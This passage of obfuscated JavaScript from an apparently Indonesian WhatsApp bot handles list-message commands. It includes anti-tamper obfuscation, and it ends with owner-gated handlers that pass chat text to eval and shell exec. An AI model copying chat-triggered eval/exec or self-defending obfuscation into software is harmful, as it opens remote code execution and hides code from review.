          const v146 = ["9GJEzmI", "key", "FvwDE", "apply", "search", "677853KGyDEt", "ge di data", "constructo", "32070NnRXaM", "HDFPe", "660iLeqyE", "oduk yang ", "ang tersed", "push", "p ini!\n\nSi", "base", "1376deNoSm", "!\n\n", "rdaftar di", "list messa", "ge yang te", "lahkan ket", "\nBerikut l", "sendMessag", "15568550dWCrGs", "62516uTrypg", "633606QJsreQ", "rowId", "Belum ada ", "diinginkan", "toString", "3670281FXgpoF", "length", "ik nama pr", "title", "Produk : ", "24416aFNZnC", "(((.+)+)+)", "OnlyGrup", "fHDuq"];
          f16 = function () {
            return v146;
          };
          return f16();
        }
        function f17(p91, p92, p93, p94) {
          return f18(p91 - -395, p94);
        }
        function f18(p95, p96) {
          const vF16 = f16();
          f18 = function (p97, p98) {
            p97 = p97 - 150;
            let v147 = vF16[p97];
            return v147;
          };
          return f18(p95, p96);
        }
        p[f17(-233, -223, -235, -243) + "e"](v18, vV164);
        break;
      case "addlist":
        if (!v65) {
          return p2.reply(`${mess.pemilikbot}`);
        }
        if (!v13 && v49 && isAlreadyResponList(v18, p2.chat, v6)) {
          if (!v58 && !isCreator) {
            return p2.reply(mess.GrupAdmin);
          }
        }
        var vGetDataResponList2 = getDataResponList(v18, p2.chat, v6);
        var v148 = q.split("@")[0];
        var v149 = q.split("@")[1];
        if (!q.includes("@")) {
          return p2.reply(`Gunakan dengan cara ${v14} *key@response*\n\n_Contoh_\n\n#${v14} tes@apa`);
        }
        if (isAlreadyResponList(v18, v148, v6)) {
          return p2.reply(`List respon dengan key : *${v148}* sudah ada di group ini.`);
        }
        addResponList(v18, v148, v149, false, "-", v6);
        p2.reply(`Berhasil menambah List menu : *${v148}*`);
        break;
      case "dellist":
        {
          function f19(p99, p100, p101, p102) {
            return f30(p99 - 812, p101);
          }
          (function (p103, p104) {
            const vP103 = p103();
            function f20(p105, p106, p107, p108) {
              return f30(p105 - 177, p106);
            }
            function f21(p109, p110, p111, p112) {
              return f30(p110 - -585, p112);
            }
            while (true) {
              try {
                const v150 = -parseInt(f21(-416, -433, -452, -419)) / 1 * (-parseInt(f21(-450, -451, -438, -451)) / 2) + parseInt(f20(309, 293, 328, 292)) / 3 + -parseInt(f21(-454, -458, -470, -451)) / 4 * (parseInt(f20(313, 332, 310, 316)) / 5) + parseInt(f21(-444, -430, -445, -444)) / 6 + -parseInt(f20(317, 317, 306, 309)) / 7 * (parseInt(f20(302, 304, 296, 292)) / 8) + -parseInt(f21(-456, -446, -427, -461)) / 9 + -parseInt(f20(300, 294, 304, 297)) / 10;
                if (v150 === p104) {
                  break;
                } else {
                  vP103.push(vP103.shift());
                }
              } catch (_0x2a47e0) {
                vP103.push(vP103.shift());
              }
            }
          })(f23, 671620);
          function f22(p113, p114, p115, p116) {
            return f30(p116 - 334, p113);
          }
          function f23() {
            const v151 = ["List : ", "search", "constructo", "\nSilahkan ", "title", "puslist Na", "ccXjW", "NkTqB", "991xBhtpe", "ma list\n\nC", "(((.+)+)+)", "5193012kQpXsR", "rowId", "apply", "push", " dengan Me", "s\n\n", "2004840mmvvRL", "sendMessag", "775904YwgTMI", "key", "280972TUACXb", "kOUOo", "Belum ada ", "puslist Te", "OnlyGrup", "435849VuKrjO", "toString", "1670FGOAdA", "ngetik .ha", "5TXKuTG", "Hai @", "mDQfl", "1953063wuguMm", "49HAjPYE", "ge di data", "ontoh: .ha", "Hapus list"];
            f23 = function () {
              return v151;
            };
            return f23();
          }
          const vF3 = function () {
            function f24(p117, p118, p119, p120) {
              return f30(p120 - 403, p119);
            }
            const v152 = {
              ccXjW: function (p121, p122) {
                return p121 === p122;
              }
            };
            v152[f24(555, 536, 541, 541)] = f24(512, 514, 528, 531);
            const vV152 = v152;
            function f25(p123, p124, p125, p126) {
              return f30(p124 - -441, p125);
            }
            let v153 = true;
            return function (p127, p128) {
              const v154 = v153 ? function () {
                function f26(p129, p130, p131, p132) {
                  return f30(p129 - -42, p132);
                }
                function f27(p133, p134, p135, p136) {
                  return f30(p134 - 251, p135);
                }
                if (p128) {
                  if (vV152[f26(108, 121, 108, 116)](vV152[f27(379, 389, 379, 384)], vV152[f27(371, 389, 406, 377)])) {
                    const v155 = p128[f26(115, 116, 118, 126)](p127, arguments);
                    p128 = null;
                    return v155;
                  } else {
                    const v156 = {};
                    v156[f26(106, 101, 95, 119)] = _0x3e00b2[f27(385, 377, 374, 382)];
                    v156[f26(114, 102, 102, 103)] = "#hapuslist " + _0x2992c9[f27(382, 377, 382, 359)];
                    _0x5612d[f26(116, 131, 115, 127)](v156);
                  }
                }
              } : function () {};
              v153 = false;
              return v154;
            };
          }();
          const vVF3 = vF3(this, function () {
            function f28(p137, p138, p139, p140) {
              return f30(p137 - -257, p138);
            }
            const v157 = {};
            v157[f29(-425, -420, -423, -413)] = f28(-103, -101, -117, -121) + "+$";
            function f29(p141, p142, p143, p144) {
              return f30(p143 - -574, p144);
            }
            const vV157 = v157;
            return vVF3[f29(-423, -427, -441, -448)]()[f29(-446, -440, -429, -434)](f29(-404, -427, -420, -433) + "+$")[f28(-124, -112, -141, -123)]()[f29(-417, -425, -428, -431) + "r"](vVF3)[f28(-112, -93, -117, -98)](vV157[f28(-106, -116, -107, -119)]);
          });
          vVF3();
          if (!v49) {
            return p2.reply(mess[f22(462, 484, 447, 465)]);
          }
          function f30(p145, p146) {
            const vF23 = f23();
            f30 = function (p147, p148) {
              p147 = p147 - 121;
              let v158 = vF23[p147];
              return v158;
            };
            return f30(p145, p146);
          }
          if (!v58 && !isOwner) {
            return p2.reply(mess.GrupAdmin);
          }
          if (v6.length === 0) {
            return p2.reply(f22(475, 467, 460, 463) + "list messa" + f22(473, 480, 469, 475) + "base");
          }
          var v159 = [];
          for (let v160 of v6) {
            if (v160.id === v18) {
              const v161 = {};
              v161.title = v160[f22(461, 454, 463, 460)];
              v161[f19(968, 952, 972, 949)] = "#hapuslist " + v160[f19(938, 955, 948, 938)];
              v159[f19(970, 985, 989, 977)](v161);
            }
          }
          let v162 = f22(486, 455, 457, 471) + v48.split("@")[0] + (f22(465, 486, 496, 481) + f22(474, 477, 474, 477) + f19(933, 936, 948, 943) + f19(947, 938, 947, 961) + f19(961, 942, 975, 943) + f22(506, 499, 489, 487) + f19(954, 937, 952, 942) + f22(481, 480, 452, 464) + f22(444, 465, 448, 456));
          for (let v163 of v159) {
            v162 += f19(956, 972, 951, 973) + v163[f22(494, 489, 488, 482)] + "\n\n";
          }
          const v164 = {
            text: v162
          };
          var vV164 = v164;
          p[f22(476, 453, 466, 458) + "e"](v18, vV164);
        }
        break;
      case "hapuslist":
        delResponList(v18, q, v6);
        p2.reply(`Sukses delete list message dengan key *${q}*`);
        break;
      default:
    }
    if (v11.startsWith("=>")) {
      if (!itsMemts) {
        return;
      }
      function f31(p149) {
        sat = JSON.stringify(p149, null, 2);
        bang = util.format(sat);
        if (sat == undefined) {
          bang = util.format(p149);
        }
        return p2.reply(bang);
      }
      try {
        p2.reply(util.format(eval(`(async () => { ${v11.slice(3)} })()`)));
      } catch (e) {
        p2.reply(String(e));
      }
    }
    if (v11.startsWith(">")) {
      if (!itsMemts) {
        return;
      }
      try {
        let v165 = await eval(v11.slice(2));
        if (typeof v165 !== "string") {
          v165 = require("util").inspect(v165);
        }
        await p2.reply(v165);
      } catch (err) {
        p2.reply(String(err));
      }
    }
    if (v11.startsWith("<")) {
      if (!itsMemts) {
        return;
      }
      try {
        return p2.reply(JSON.stringify(eval(`${v19.join(" ")}`), null, "\t"));
      } catch (e) {
        reply(e);
      }
    }
    if (v11.startsWith("$")) {
      if (!itsMemts) {
        return;
      }
      qur = v11.slice(2);
      exec(qur, (p150, p151) => {
        if (p150) {
          return p2.reply(`${p150}`);
        }
        if (p151) {
          p2.reply(p151);
        }
      });
    }
  } catch (err) {
    p2.reply(util.format(err));
  }
};
